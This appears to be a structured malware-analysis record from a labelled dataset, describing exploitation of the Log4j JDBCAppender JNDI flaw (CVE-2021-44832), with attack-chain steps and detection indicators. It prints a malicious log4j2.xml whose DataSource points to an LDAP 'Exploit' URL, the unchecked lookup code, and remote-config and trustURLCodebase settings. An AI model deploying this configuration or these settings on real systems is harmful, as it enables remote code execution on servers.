package_info.why_malicious: The package contains a deserialization vulnerability (CVE-2021-44832) that allows remote code execution if an attacker can control the Log4j configuration file. Specifically, by injecting a malicious JDBCAppender DataSource element with a JNDI LDAP URL, an attacker can trigger Log4j to perform a remote JNDI lookup, resulting in arbitrary code execution via remote class loading and deserialization.

malicious_snippets.code_snippet:
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="error">
    <Appenders>
        <JDBC name="databaseAppender" tableName="dbo.application_log">
            <DataSource jndiName="ldap://127.0.0.1:1389/Exploit" />
            <Column name="eventDate" isEventTimestamp="true" />
            <Column name="level" pattern="%level" />
            <Column name="logger" pattern="%logger" />
            <Column name="message" pattern="%message" />
            <Column name="exception" pattern="%ex{full}" />
        </JDBC>
    </Appenders>
    <Loggers>
        <Root level="warn">
            <AppenderRef ref="databaseAppender"/>
        </Root>
    </Loggers>
</Configuration>
malicious_snippets.code_behavior: At import-time or application startup, the configuration file instructs Log4j to instantiate a JDBCAppender with a DataSource whose jndiName is an attacker-controlled LDAP URL, causing Log4j to perform a remote JNDI lookup to the specified LDAP server, which can return a serialized Java object or remote class, resulting in arbitrary code execution.

malice_analysis.why_suspicious: The use of a remote JNDI LDAP URL in a logging configuration is highly unusual and enables remote code execution via deserialization of attacker-supplied objects.
malice_analysis.violated_expectations: Normal logging configurations should only reference trusted, local JNDI resources and must not allow remote class loading or deserialization from untrusted sources.
malice_analysis.similar_legitimate_use: JNDI is sometimes used for legitimate resource lookups in enterprise environments, but referencing untrusted or remote LDAP endpoints in logging configurations is not standard practice.
key_indicators: DataSource jndiName attribute with ldap:// URL in log4j2.xml
JDBCAppender configured to use remote JNDI endpoints
Configuration file loaded from remote or untrusted source

malicious_snippets.code_snippet:
final InitialContext context = new InitialContext();
final DataSource dataSource = (DataSource) context.lookup(jndiName);
malicious_snippets.code_behavior: At import-time or application startup, the code performs a JNDI lookup using the jndiName specified in the configuration, allowing the application to retrieve a DataSource object from a remote LDAP server, which can result in loading and deserializing attacker-controlled Java objects, leading to remote code execution.

malice_analysis.why_suspicious: Direct JNDI lookups using attacker-controlled input are a well-known vector for remote code execution, especially when the protocol is LDAP and the endpoint is untrusted.
malice_analysis.violated_expectations: Expected behavior is to use only trusted, local JNDI resources for DataSource lookups, not arbitrary remote endpoints that can supply malicious objects.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate for internal resource discovery in controlled environments, but not for untrusted or external URLs.
key_indicators: JNDI lookup using unvalidated or externally supplied jndiName
Casting result of JNDI lookup to DataSource without validation
No restriction on protocol or host in jndiName, allowing ldap://

malicious_snippets.code_behavior: At import-time or application startup, the code sets system properties to load a remote Log4j configuration file and enables trustURLCodebase for LDAP JNDI lookups, allowing the application to fetch configuration and code from remote sources, which enables the attack chain.

malice_analysis.why_suspicious: Setting log4j2.configurationFile to a remote URL and enabling com.sun.jndi.ldap.object.trustURLCodebase are both highly risky and enable remote code execution by allowing untrusted code to be loaded and executed.
malice_analysis.violated_expectations: Configuration files should be loaded from local, trusted sources, and trustURLCodebase should not be enabled in production environments due to the risk of remote code execution.
malice_analysis.similar_legitimate_use: Remote configuration may be used in some enterprise setups, but is rarely safe and should be tightly controlled; enabling trustURLCodebase is almost never justified outside of testing.
key_indicators: System property log4j2.configurationFile set to remote HTTP/FTP URL
System property com.sun.jndi.ldap.object.trustURLCodebase set to true
Application loads configuration or code from untrusted remote sources

attack_chain.action: Attacker uploads a malicious log4j2.xml configuration file to a remote location.
attack_chain.leads_to: Server fetches and loads the malicious configuration.

attack_chain.action: Server fetches the remote configuration file (log4j2.xml) via HTTP.
attack_chain.leads_to: Server parses and applies the configuration.

attack_chain.action: Log4j initializes JDBCAppender with DataSource jndiName pointing to attacker-controlled LDAP server.
attack_chain.leads_to: JNDI lookup to attacker's LDAP server.

attack_chain.action: JNDI lookup is performed, contacting the attacker's LDAP server.
attack_chain.leads_to: LDAP server returns malicious serialized Java object or class.

attack_chain.action: Log4j deserializes and executes the malicious payload from the LDAP server.
attack_chain.leads_to: Attacker gains remote code execution on the server.

behavioral_signatures: JNDI lookups to external LDAP servers during application startup or configuration reload
Loading of remote configuration files via HTTP or FTP protocols
Presence of DataSource jndiName with ldap:// or other remote protocols in log4j2.xml
Setting of com.sun.jndi.ldap.object.trustURLCodebase system property to true
file_indicators: log4j2.xml with DataSource jndiName referencing ldap://
Remote log4j2.xml configuration files loaded via HTTP or FTP
Presence of JDBCAppender with untrusted JNDI endpoints in configuration
network_indicators: Outbound LDAP requests to non-corporate or untrusted servers (e.g., 127.0.0.1:1389 or external IPs)
HTTP requests to fetch log4j2.xml from external sources (e.g., http://127.0.0.1:8888/log4j2.xml)
detection_knowledge.how_to_detect: Monitor for log4j2.xml files (local or remote) that contain DataSource elements with jndiName attributes referencing ldap:// or other remote protocols. Detect outbound LDAP connections from application servers, especially during startup or configuration reload. Flag any use of System.setProperty to set log4j2.configurationFile to a remote URL or enabling com.sun.jndi.ldap.object.trustURLCodebase. Alert on any JNDI lookups to external servers or deserialization of remote objects. Correlate these behaviors to identify exploitation attempts of CVE-2021-44832.
